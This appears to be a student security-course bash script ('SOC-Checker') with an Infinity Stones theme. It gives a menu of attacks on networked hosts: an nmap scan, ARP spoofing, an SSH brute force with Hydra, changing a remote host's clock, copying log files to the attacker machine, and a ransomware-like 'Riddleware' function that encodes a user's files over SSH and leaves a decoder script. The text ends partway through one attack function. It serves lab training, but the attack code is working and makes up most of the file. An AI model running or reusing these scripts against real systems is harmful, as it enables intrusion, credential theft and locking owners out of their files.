#!/bin/bash

sudo -v #To minimize sudo typing eg. file creation/editing documents in /var/log

#Shortcut for formatting (aesthetic purpose only)
underline=`tput smul`
nounderline=`tput rmul`
bold=`tput bold`
normal=`tput sgr0`
RED="\e[31m"
ORANGE="\e[91m"
GREEN="\e[32m"
BLUE="\e[34m"
YELLOW="\e[33m"
PURPLE="\e[35m"
CYAN="\e[36m"
ENDCOLOR="\e[0m"

function file_exist_check()
{
if [ -f $1 ]
then 
	#echo "File: $1 exists" # only for checking/testing
	echo "" # silent mode, outputs nothing if file exist
else 
	sudo touch $1
	sudo chmod 666 $1 # Without this, sometimes there are permission issues
	echo "" # silent mode, outputs nothing as file is created above
	#echo "File: $1 created" # only for checking/testing
fi
}

file_exist_check /var/log/gauntlet.log #This function is to look for gauntlet.log (attack log) and create it if it does not exist

#Project Banner

echo -e "${bold}\e[31m ____   ___   ____       ____ _   _ _____ ____ _  _______ ____  "
sleep 0.3
echo -e "\e[33m/ ___| / _ \ / ___|     / ___| | | | ____/ ___| |/ / ____|  _ \ "
sleep 0.3
echo -e "\e[31m\___ \| | | | |   _____| |   | |_| |  _|| |   | ' /|  _| | |_) |"
sleep 0.3
echo -e "\e[33m ___) | |_| | |__|_____| |___|  _  | |__| |___| . \| |___|  _ < "
sleep 0.3
echo -e "\e[31m|____/ \___/ \____|     \____|_| |_|_____\____|_|\_\_____|_| \_\ "

echo -e "\e[32mSOC Module Project"
echo -e "\e[36m"
sleep 1
echo "Name          		:Fransiskus Asisi Bhismobroto"
sleep 0.3
echo "Student Code  		:s10"
sleep 0.3
echo "Class Code    		:CFC090423"
sleep 0.3
echo "Lecturer Name 		:Wei Chea"
echo -e "\e[0m${normal}"
sleep 1

echo ""
echo -e "${CYAN}----------You have been bequeathed the power of the Infinity Stones by APT (Amazingly Persitent Thanos)--------------"
sleep 1.5
echo -e "${CYAN}--------------------------You may use the stones' specific power for each cyberattack!-------------------------------"
sleep 1.5
echo -e "${RED} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ORANGE} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀ ${YELLOW}⠀⠀ ⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${GREEN}⠀⠀ ⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀ ${BLUE}⠀⠀ ⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${PURPLE}⠀⠀⠀ ⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ORANGE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${YELLOW}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${GREEN}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${BLUE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${PURPLE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ORANGE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${YELLOW}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${GREEN}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${BLUE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${PURPLE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ORANGE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${YELLOW}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${GREEN}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${BLUE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${PURPLE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ORANGE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${YELLOW}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${GREEN}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${BLUE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${PURPLE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ORANGE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${YELLOW}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${GREEN}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${BLUE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${PURPLE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ORANGE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${YELLOW}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${GREEN}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${BLUE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${PURPLE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 0.3
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ORANGE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${YELLOW}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${BLUE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${PURPLE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 0.5
echo -e "${RED} ⠀⠀⠀   Reality     ${ORANGE} ⠀⠀⠀    Soul       ${YELLOW}⠀⠀ ⠀     Mind      ${GREEN}⠀⠀ ⠀     Time⠀⠀⠀   ${BLUE}⠀⠀ ⠀    Space⠀  ⠀⠀⠀${PURPLE}⠀⠀⠀     Power  ⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${RED} ⠀⠀⠀    Stone      ${ORANGE} ⠀⠀⠀    Stone      ${YELLOW}⠀⠀ ⠀     Stone     ${GREEN}⠀⠀ ⠀     Stone⠀⠀   ${BLUE}⠀⠀ ⠀    Stone⠀  ⠀⠀⠀${PURPLE}⠀⠀⠀     Stone  ⠀⠀⠀⠀${ENDCOLOR}"
sleep 0.3
echo ""
echo -e "${CYAN}--------------------------------------------------------------------------------------------------------------------"


# Description of each Attack

function space_stone_display()
{
echo -e "${CYAN}Behold, the Space Stone${ENDCOLOR}"
sleep 2
echo -e "${BLUE} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${BLUE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${BLUE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${BLUE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${BLUE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${BLUE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${BLUE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${BLUE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Space stone grants its wielder space interpretation ability${ENDCOLOR}"
echo -e "${CYAN}by scanning know which portals (or rather, ports) are open for further enumeration/exploitation${ENDCOLOR}"
echo -e "${BLUE}Description : Performing nmap SYN scan to probe all TCP ports${ENDCOLOR}"
echo -e "${BLUE}Rationale   : Preliminary Stage attack which enumeration results can be a basis of further attacks${ENDCOLOR}"
echo -e "${BLUE}Stage       : Scanning and Enumeration${ENDCOLOR}"
echo -e "${BLUE}Prerequisite: Installation of nmap${ENDCOLOR}"
echo ""
sleep 2
}

function reality_stone_display()
{
echo -e "${CYAN}Behold, the Reality Stone${ENDCOLOR}"
sleep 2
echo -e "${RED} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${RED}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${RED}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${RED}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${RED}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${RED}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${RED}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Reality stone grants its wielder the power to create 'mirror dimension', ${ENDCOLOR}"
echo -e "${CYAN}by accessing a few log files, creating it in user home, while downloading it to attacker machine${ENDCOLOR}"
echo -e "${RED}Description : Copying dpkg.log, auth.log, syslog, kern.log, bootstrap.log to user home, create a modified copies,${ENDCOLOR}"
echo -e "${RED}            : download the information to attacker machine for further analysis${ENDCOLOR}"
echo -e "${RED}Rationale   : For this project, only a limited copy is created in user home ${ENDCOLOR}"
echo -e "${RED}Rationale   : In actual attack, an inhuman multitude number of files can be generated, compromising memory/disk availability${ENDCOLOR}"
echo -e "${RED}Stage       : Post-Exploitation${ENDCOLOR}"
echo -e "${RED}Prerequisite: sshpass installed, ssh service active in target, credentials for user with sudo privileges${ENDCOLOR}"
echo ""
sleep 2
}

function soul_stone_display()
{
echo -e "${CYAN}Behold, the Soul Stone${ENDCOLOR}"
sleep 2
echo -e "${ORANGE} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${ORANGE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${ORANGE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${ORANGE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${ORANGE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${ORANGE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${ORANGE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${ORANGE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Soul stone grants its wielder the ability to manipulate the essence of a host by manipulating the wielder's identity${ENDCOLOR}"
echo -e "${CYAN}Spoofing is one way to change who you are in virtual environment${ENDCOLOR}"
echo -e "${ORANGE}Description : A type of attack where the attacker broadcast to target victim that attacker is another host (typically gateway, but can be any host IP)${ENDCOLOR}"
echo -e "${ORANGE}Rationale   : This attack enables the attacker to receive confidential information they are not privy to ${ENDCOLOR}"
echo -e "${ORANGE}Stage       : Any stage, but more common in early stage to obtain credentials or other information for further attack${ENDCOLOR}"
echo -e "${ORANGE}Prerequisite: dsniff installed ${ENDCOLOR}"
echo ""
sleep 2
}

function time_stone_display()
{
echo -e "${CYAN}Behold, the Time Stone${ENDCOLOR}"
sleep 2
echo -e "${GREEN} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${GREEN}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${GREEN}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${GREEN}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${GREEN}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${GREEN}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${GREEN}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Time stone grants its wielder the ability to manipulate time in the system${ENDCOLOR}"
echo -e "${GREEN}Description : Change time in target host${ENDCOLOR}"
echo -e "${GREEN}Rationale   : A simple tweak that may cause confusion, inconvenience (event logged at wrong time) or dysfunction (some system may breakdown) ${ENDCOLOR}"
echo -e "${GREEN}Stage       : Any stage but most commonly Post-Exploitation to taint the integrity of log files/metadata${ENDCOLOR}"
echo -e "${GREEN}            : or attack the availability of SIEM that rely on time${ENDCOLOR}"
echo -e "${GREEN}Prerequisite: sshpass installed, ssh service active in target, credentials for user with sudo privileges${ENDCOLOR}"
echo ""
sleep 2
}

function power_stone_display()
{
echo -e "${CYAN}Behold, the Power Stone${ENDCOLOR}"
sleep 2
echo -e "${PURPLE} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${PURPLE}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${PURPLE}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${PURPLE}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${PURPLE}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${PURPLE}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${PURPLE}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${PURPLE}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Power stone grants its wielder to use the highest level of force: BRUTE FORCE!${ENDCOLOR}"
echo -e "${CYAN}Need to Infiltrate? Now that looks like to job for Hydra! (marvel pun intended)${ENDCOLOR}"
echo -e "${PURPLE}Description : Performing Brute Force login based on list of credentials${ENDCOLOR}"
echo -e "${PURPLE}Rationale   : Enable remote access via login credential when successful${ENDCOLOR}"
echo -e "${PURPLE}Stage       : Exploitation${ENDCOLOR}"
echo -e "${PURPLE}Prerequisite: Installation of hydra, ssh service open at target${ENDCOLOR}"
echo ""
sleep 2
}

function mind_stone_display()
{
echo -e "${CYAN}Behold, the Mind Stone${ENDCOLOR}"
sleep 2
echo -e "${YELLOW} ⠀⠀⠀⢀⢀⣀⡤⠤⣀⣠⡤⠤⣄⡀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${YELLOW}⠀⠀⠀⡐⠙⣄⠤⠛⠉⠁⠈⠑⠠⢄⡜⠐⠄⠀⠀${ENDCOLOR}"
echo -e "${YELLOW}⢀⣼⠯⠒⠉⠈⠑⢄⠀⠀⠀⠀⠔⠉⠈⠑⠠⢈⣀${ENDCOLOR}"
echo -e "${YELLOW}⠛⢔⠂⠠⠤⣂⡀⣀⣙⡒⣊⣀⡀⣀⡣⠤⠐⣢⠟${ENDCOLOR}"
echo -e "${YELLOW}⠀⠈⠱⣦⡀⠘⡄⠀⠀⡘⡀⠀⢀⠜⠀⠀⢠⠎⠁${ENDCOLOR}"
echo -e "${YELLOW}⠀⠀⠀⠀⠈⠢⡘⡄⢠⠃⢃⢀⠊⢀⡠⠈⠀⠀⠀${ENDCOLOR}"
echo -e "${YELLOW}⠀⠀⠀⠀⠀⠀⠈⠻⣜⠀⢸⢂⣠⠚⠀⠀⠀⠀⠀${ENDCOLOR}"
echo -e "${YELLOW}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠗⠉⠀⠀⠀⠀⠀⠀⠀${ENDCOLOR}"
sleep 2
echo -e "${CYAN}The Mind stone grants its wielder to test the if the victim is intelligently-worthy to get their files back${ENDCOLOR}"
echo -e "${CYAN}Intended as variant of Ransomware, it creates 'Riddleware' that encode scripts and will decode it if the quizzes are completed successfully${ENDCOLOR}"
echo -e "${YELLOW}Description : A variant of ransomware, where instead of asking the target victim to pay,${ENDCOLOR}"
echo -e "${YELLOW}              after the documents are encrypted, the victim have to answer a series of riddles${ENDCOLOR}"
echo -e "${YELLOW}              Upon successful completion of the riddles, all the documents would be decrypted${ENDCOLOR}"
echo -e "${YELLOW}Rationale   : This is a substitute of ransomware attack that makes target documents unavailable until completion of tasks ${ENDCOLOR}"
echo -e "${YELLOW}Stage       : Post-exploitation/Action on Objectives${ENDCOLOR}"
echo -e "${YELLOW}Prerequisite: Intel on a known target directory on the host, sshpass installed, ssh service active in target, Credentials of sudo user in target host${ENDCOLOR}"
echo ""
sleep 2
}

# Discovering IP available in the network

function choose_ip_to_attack()
{
sleep 1.5
echo ""
echo "${underline}The current chosen IP to attack is: $chosen_ip_to_attack${nounderline}"
echo "Are you happy to proceed with this IP? (Please input your choice Y/N/R accordingly):  
Y : That is the correct Target
N : No, I would like to choose the target
R : Randomize the IP to be targeted"
read confirmed_ip_action
case $confirmed_ip_action in
Y|y)
	if [ $chosen_ip_to_attack == "Invalid" ]
	then
		echo "Inputted IP is still Invalid"
		choose_ip_to_attack
	else
		echo "TARGET LOCKED: $chosen_ip_to_attack"
	fi
;;
N|n)
	echo "The available IP to attack are:"
	cat host_list
	echo ""
	echo "Which IP would you choose to attack?"
	read chosen_ip_to_attack
	# perform check that inputted IP is in host list, otherwise indicate invalid and cannot proceed
	matching_ip=$(cat host_list | grep $chosen_ip_to_attack | wc -l)
	if [ $matching_ip -ge 1 ]
	then
		echo "Inputted IP is valid (among available host in the network)"
	else
		echo "Inputted IP is invalid"
		echo "Please choose from available IP"
		chosen_ip_to_attack="Invalid"
	fi
	choose_ip_to_attack
;;
R|r)
	echo "You have chosen to pick the target at random"
	list_length=$(cat host_list | wc -l)
	list_randomizer=$((1 + RANDOM % list_length)) #The plus one is because the remainder of % operator can be zero
	chosen_ip_to_attack=$(cat host_list | head -n $list_randomizer | tail -n 1)
	choose_ip_to_attack
;;
*)
	echo "You have chosen an invalid choice"
	choose_ip_to_attack
;;
esac 
}

function file_encoding() # IMPORTANT! This file encoding only works if the target files are short. After a certain length, there are spaces in base64 bash result that cause problem in decoding
{
for file in ./*
do
	data=$(cat $file | tr '[A-Za-z]' '[E-ZA-De-za-d]' | base64 )
	echo $data > $file
done
}

function attack_or_back()
{
echo "Would you like to use the $stone_choice stone to attack?"
echo "
Input Y to confirm and wield the $stone_choice stone
Input N to reconsider other stones"
read ACTION
echo ""
case $ACTION in
Y|y)
	echo "Preparing to attack"
	sleep 1.5
	echo "Please choose a target from the list of available hosts"
	sleep 1
	echo "The default IP to be attacked is the first one (arranged numerically) from the list"
	chosen_ip_to_attack=$(cat host_list | head -n 1)
	choose_ip_to_attack
	echo "Entering Attack Phase...."
	sleep 1.5
	echo "Launching Attack...."
	echo ""
	sleep 2.5
	case $stone_choice in
	space)
		space_stone_attack
	;;
	reality)
		reality_stone_attack
	;;
	soul)
		soul_stone_attack
	;;
	time)
		time_stone_attack
	;;
	power)
		power_stone_attack
	;;
	mind)
		mind_stone_attack
	esac
;;
N|n)
	main_console
;;
*)
	echo "Kindly choose a valid action only:'Y/n' !!!"
	sleep 1.5
	main_console
;;
esac
}

function action_after_attack()
{
echo ""
echo "Attack Has Been Launched and Completed! Logged in /var/log/gauntlet.log"
echo "What shall we do next? Please input accordingly"
echo "
Input A to relaunch the same attack
Input B to choose a new target (by IP number)
Input C to change the method (ie. another infinity stone) 
Input D to EXIT SCRIPT"
read OPTIONS
case $OPTIONS in
A|a)
	case $stone_choice in
	space)
		space_stone_attack
	;;
	reality)
		reality_stone_attack
	;;
	soul)
		soul_stone_attack
	;;
	time)
		time_stone_attack
	;;
	power)
		power_stone_attack
	;;
	mind)
		mind_stone_attack
	esac
;;
B|b)
	attack_or_back
;;
C|c)
	main_console
;;
D|d)
	echo "${bold}-----Stage II Concluded-----${normal}"	
	echo "Terminating Project SOC-Checker |||||----------|"
	rm host_list # At the end stage, delete all temporary files
	sleep 1
	echo "Terminating Project SOC-Checker ||||||||||-----|"
	sleep 1
	echo "Terminating Project SOC-Checker ||||||||||||||||"
	sleep 1
	exit
;;
*)
	echo "Kindly choose a valid action only:'Y/n' !!!"
	sleep 1.5
	action_after_attack
esac
}

#Stage I Banner
echo -e "${bold}\e[31m ____  _                     ___ "
sleep 0.5
echo -e "\e[33m/___ || |_ __ _  __ _  ___  |_ _|\e[31m"
sleep 0.5
echo -e '\___ \| __  _` |/ _`  / _ \  | | '
sleep 0.5
echo -e "\e[33m ___) | || (_| | (_| |  __/  | | "
sleep 0.5
echo -e "\e[31m|____/ \__\__,_|\__, |\___| |___|"
sleep 0.5
echo -e "\e[33m                |___/            "
sleep 0.5
echo -e "\e[32mHost Discovery"
echo -e "\e[0m${normal}"
sleep 1.5

if [ -f hydra.restore ] # Cleaning up so that previous unfinished scan does not interfere with fresh scans
then 
	sudo rm hydra.restore
	echo "" #"hydra.restore file deleted" # silent mode, hide info from end user but ensure no hydra.restore document
else 
	echo "" #"No hydra.restore file identified" # silent mode, hide info from end user but ensure no hydra.restore document
fi

my_own_ip=$(ifconfig | grep broadcast | awk '{print $2}') # For logging purpose

# Defining each attack via function

function mind_stone_attack()
{
echo "Executing Mind Stone Attack: Riddleware"
echo "You have chosen $chosen_ip_to_attack as the target"

# Input known Username and Password for SSH Purpose (preferably user with privilege escalation ability /sudo privileges)
read -p "Please enter Remote Server Username  :     " username_input
read -s -p "Please enter Remote Server Password  :     " pw_input 

# Actual Attack (via remote_commands) and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration
# This works on the assumption that there is a directory called 'target' in 'home' of user.
# Kindly amend the "cd target" below if there is another target directories to be encoded/attacked

# Remember to amend the change directory destination below if there is intel on where are the target files to be encoded
remote_commands="echo 'Connected to Target!';
sleep 1.5;
cd;
cd target;
mkdir sementara;
mv * sementara 2>/dev/null;
cd sementara;
$(declare -f file_encoding); file_encoding;
mv ./* ..;
cd ..;
rm -r sementara;
sudo chmod 666 *;
exit;
/bin/bash"

# Actual one-liner to call up list of functions to be executed on remote server and keep connection until otherwise commanded
SSHPASS=$pw_input sshpass -e ssh -t -o StrictHostKeyChecking=no $username_input@$chosen_ip_to_attack "$remote_commands"
scp ./mjolnir.sh $username_input@$chosen_ip_to_attack:~/target #To leave "ransom notes" or in this case a script for decrypting the files
SSHPASS=$pw_input sshpass -e ssh -t -o StrictHostKeyChecking=no $username_input@$chosen_ip_to_attack "sudo chmod 111 ~/target/mjolnir.sh"
# Ensure this is updated as the intel on the target file is updated, unless other files are affected

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))

attack_time=$(date +"%Y-%m-%d/%H:%M:%S") # Time is recorded just after the file encryption is done
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log
action_after_attack
}

function power_stone_attack()
{
echo "Executing Power Stone Attack: Brute Force"
echo "You have chosen $chosen_ip_to_attack as the target"

# Create temporary username and password document from the unpw.lst file
cat unpw.lst | grep usernamex | awk '{print $NF}' > username_temp
cat unpw.lst | grep passwordx | awk '{print $NF}' > password_temp

# Actual Attack and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration 
hydra -L username_temp -P password_temp -vv -t 8 ssh://$chosen_ip_to_attack >> power_result

# Measuring attack duration for logging
ending_attack=$(date +%s)
time_taken=$(($ending_attack-$beginning_attack))
time_taken_formatted=$(printf '%02dh:%02dm:%02ds\n' $((time_taken/3600)) $((time_taken%3600/60)) $((time_taken%60)))
attack_time=$(date +"%Y-%m-%d/%H:%M:%S") # Time is recorded just after the brute force attempt is done
sudo -v
executor=$(whoami)
log_entry="$attack_time $executor $time_taken_formatted $stone_choice $attack_method $my_own_ip attacking $chosen_ip_to_attack"
sudo echo "$log_entry" >> /var/log/gauntlet.log

rm username_temp
rm password_temp

action_after_attack
}

function reality_stone_attack()
{
echo "Executing Reality Stone Attack: Mirror Dimension"
echo "You have chosen $chosen_ip_to_attack as the target"

# Input known Username and Password for SSH Purpose (preferably user with privilege escalation ability /sudo privileges)
read -p "Please enter Remote Server Username  :     " username_input
read -s -p "Please enter Remote Server Password  :     " pw_input 

# Actual Attack (via remote_commands) and concurrent Result Logging
beginning_attack=$(date +%s) #start attack timer for duration
remote_commands="echo 'Connected to Target!';
sleep 1.5;
cd;
mkdir mirror_dimension;
cd mirror_dimension;
sudo touch cermin.txt ;
sudo touch spiegel.txt;
sudo touch miroir.txt; 
sudo touch espejo.txt;
sudo touch geoul.txt;
